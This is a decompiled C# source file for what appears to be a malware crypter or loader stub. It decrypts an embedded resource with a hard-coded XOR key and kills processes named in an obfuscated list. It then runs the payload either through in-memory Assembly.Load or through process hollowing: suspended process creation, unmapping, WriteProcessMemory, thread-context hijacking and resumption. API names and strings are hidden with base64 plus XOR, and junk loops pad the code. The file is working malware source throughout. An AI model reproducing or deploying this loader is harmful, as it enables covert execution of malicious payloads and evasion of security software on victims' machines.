using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal sealed class Class0
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static bool bool_0 = false;

	private static byte byte_0 = 21;

	public static byte[] smethod_0(byte[] byte_1, double double_0, decimal decimal_0)
	{
		byte[] array = new byte[17]
		{
			57, 130, 216, 225, 167, 186, 89, 88, 244, 58,
			72, 131, 29, 60, 62, 146, 174
		};
		int num = array.Length;
		int num2 = checked(byte_1.Length - 1);
		for (int i = 0; i <= num2; i = checked(i + 1))
		{
			byte_1[i] = (byte)(byte_1[i] ^ array[i % num]);
		}
		return byte_1;
	}

	public static string smethod_1(string string_0)
	{
		int num = 10;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 36);
			ushort num2 = 6;
			do
			{
				num2 = (ushort)unchecked((uint)(num2 + 1));
			}
			while (unchecked((uint)num2) <= 78u);
			return Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(string_0), 29784.0, new decimal(231324283L)));
		}
	}

	public static void smethod_2()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		string[] array = default(string[]);
		int num6 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 176:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0037;
						case 5:
							goto IL_0044;
						case 6:
							goto IL_0053;
						case 7:
							goto IL_005e;
						case 4:
							goto IL_006a;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0044:
					num = 5;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_0053;
					IL_0053:
					num = 6;
					goto IL_0056;
					IL_000a:
					num = 2;
					array = smethod_1("ec20jd7+Oz+0aSrqeH9K4MJ577qAyvoZGLROKfB2UVng7nnKsYvG2TIMnFM7w0tVTObbWO74seT6DR25XyXsb0Vt8c9X7L2T5w==").Split(new char[1] { Conversions.ToChar(smethod_1("eQ==")) });
					goto IL_0037;
					IL_0037:
					num = 3;
					num6 = 0;
					goto IL_006a;
					IL_006a:
					num = 4;
					processesByName = Process.GetProcessesByName(array[num6]);
					num5 = 0;
					goto IL_0056;
					IL_0056:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_0044;
					}
					goto IL_005e;
					IL_005e:
					num = 7;
					num6 = checked(num6 + 1);
					if (num6 > 11)
					{
						goto end_IL_0001_2;
					}
					goto IL_006a;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 176;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static int smethod_3(decimal decimal_0, int int_0, byte[] byte_1, ushort ushort_0)
	{
		return checked(Color.FromArgb(byte_1[int_0 + 3], byte_1[int_0 + 2], byte_1[int_0 + 1], byte_1[int_0])).ToArgb();
	}

	public static byte[] smethod_4(int int_0)
	{
		bool flag = false;
		int num = 18;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 53);
		if (!flag)
		{
		}
		Color color = Color.FromArgb(int_0);
		return new byte[4] { color.B, color.G, color.R, color.A };
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T smethod_5<T>(string string_0, int int_0)
	{
		return Conversions.ToGenericParameter<T>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary(string_0.Split(new char[1] { Convert.ToChar(58) })[0]), string_0.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(T)));
	}

	public static void smethod_6(object object_0)
	{
		MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
		if (entryPoint.GetParameters().Length == 0)
		{
			entryPoint.Invoke(null, null);
			return;
		}
		entryPoint.Invoke(null, new object[1] { new string[0] });
	}

	public static void smethod_7(byte[] byte_1)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 100);
			if (byte_1[60] == 128)
			{
				Thread thread = new Thread(smethod_6);
				thread.SetApartmentState(ApartmentState.STA);
				byte b = 0;
				do
				{
					for (int i = b; i <= 30 && i != 25; i++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				thread.Start(byte_1);
				return;
			}
			string string_ = Assembly.GetEntryAssembly()!.Location;
			if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("A96Ik8jdKzmZGg7qcVlNsoZBuu7I")))
			{
				string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("A96PiMneNi+HZgXqfk5R4cFf9vav4u4FHoZbJeZqU0z5"));
				foreach (string text in directories)
				{
					if (text.ToLower().Contains(smethod_1("T7D20Yk=")))
					{
						string_ = text + smethod_1("ZeGuldXfKnaRQi0=");
						break;
					}
				}
			}
			byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num2 = smethod_3(new decimal(-411370683L), 60, byte_1, 23202);
			int num3 = BitConverter.ToInt16(byte_1, num2 + 6);
			IntPtr intptr_ = new IntPtr(smethod_3(new decimal(-598724662L), num2 + 84, byte_1, 16854));
			IntPtr[] array3 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!smethod_5<Delegate0>(smethod_1("Uueqj8LWamrOeTrmfEhbwtxW4b2S1Ps="), -703304578)(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
			{
				return;
			}
			bool flag = true;
			string text2 = " #B*";
			int k = 0;
			for (int length = text2.Length; k < length; k++)
			{
				_ = text2[k];
			}
			if (!flag)
			{
			}
			try
			{
				uint[] array4 = new uint[179];
				array4[0] = 65538u;
				if (smethod_5<Delegate1>(smethod_1("Uueqj8LWamrOfS33SVRM989dwbeP098hLA=="), 0)(array3[1], array4))
				{
					Delegate2 @delegate = smethod_5<Delegate2>(smethod_1("Uueqj8LWamrOaC3ieWxM/c1c8auswtc2Ko0="), 0);
					IntPtr intptr_2 = array3[0];
					IntPtr intptr_3 = new IntPtr(unchecked((long)array4[41]) + 8L);
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)smethod_5<Delegate3>(smethod_1("V/a8jcuAFyyhVCXibWpX99l25IuExM4wN5o="), 1566423060)(array3[0], intptr_5)) == 0L)
					{
						Delegate4 delegate2 = smethod_5<Delegate4>(smethod_1("Uueqj8LWamrObCHxaUlf/u9V7reC4sI="), 0);
						IntPtr intptr_7 = array3[0];
						IntPtr intPtr2 = new IntPtr(smethod_3(new decimal(871306031L), num2 + 52, byte_1, 10213));
						IntPtr intptr_8 = intPtr2;
						IntPtr intptr_9 = new IntPtr(smethod_3(new decimal(1301650415L), num2 + 80, byte_1, 22336));
						IntPtr intptr_10 = delegate2(intptr_7, intptr_8, intptr_9, 12288, 64);
						Delegate5 delegate3 = smethod_5<Delegate5>(smethod_1("Uueqj8LWamrObTrqaVlu4MFa56uS6t80N4ZD"), 1333374731);
						delegate3(array3[0], intptr_10, byte_1, intptr_, ref intptr_6);
						int[] array5 = new int[10];
						int num4 = num3 - 1;
						for (int l = 0; l <= num4; l++)
						{
							array5[0] = 13;
							array5[5] = 255 + array5[0];
							Buffer.BlockCopy(byte_1, num2 + 248 + l * 40, array5, 0, 40);
							byte[] array6 = new byte[array5[4] - 1 + 1];
							Buffer.BlockCopy(byte_1, array5[5], array6, 0, array6.Length);
							array5.Length.ToString();
							IntPtr intptr_11 = array3[0];
							intptr_9 = new IntPtr(intptr_10.ToInt32() + array5[3]);
							IntPtr intptr_12 = intptr_9;
							intPtr2 = new IntPtr(array6.Length);
							delegate3(intptr_11, intptr_12, array6, intPtr2, ref intptr_6);
						}
						IntPtr intptr_13 = array3[0];
						intptr_9 = new IntPtr(unchecked((long)array4[41]) + 8L);
						IntPtr intptr_14 = intptr_9;
						byte[] array7 = smethod_4(intptr_10.ToInt32());
						intPtr2 = new IntPtr(4);
						delegate3(intptr_13, intptr_14, array7, intPtr2, ref intptr_6);
						array4[44] = (uint)(intptr_10.ToInt32() + smethod_3(new decimal(586947562L), num2 + 40, byte_1, 2452));
						smethod_5<Delegate1>(smethod_1("Uueqj8LWamrOaS33SVRM989dwbeP098hLA=="), 0)(array3[1], array4);
						smethod_5<Delegate6>(smethod_1("Uueqj8LWamrOaC3waFFbxsZL57mF"), -955350781)(array3[1]);
						return;
					}
				}
				float num5 = 0f;
				do
				{
					num5 += 1f;
				}
				while (num5 <= 29f);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.GetProcessById(array3[2].ToInt32()).Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		short num5 = default(short);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 157:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0016;
						case 5:
							goto IL_0023;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0023:
					num = 5;
					resourceManager = new ResourceManager("0hjh50e5", Assembly.GetExecutingAssembly());
					break;
					IL_0016:
					do
					{
						num = 4;
						checked
						{
							num5 = (short)unchecked(num5 + 1);
						}
					}
					while (num5 <= 94);
					goto IL_0023;
					IL_0009:
					num = 2;
					smethod_2();
					goto IL_0011;
					IL_0011:
					num = 3;
					num5 = 1;
					goto IL_0016;
					end_IL_0001_2:
					break;
				}
				num = 6;
				smethod_7(smethod_0((byte[])resourceManager.GetObject(smethod_1("VefsjM+KOmg=")), -5440.439, new decimal(1821937578L)));
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 157;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
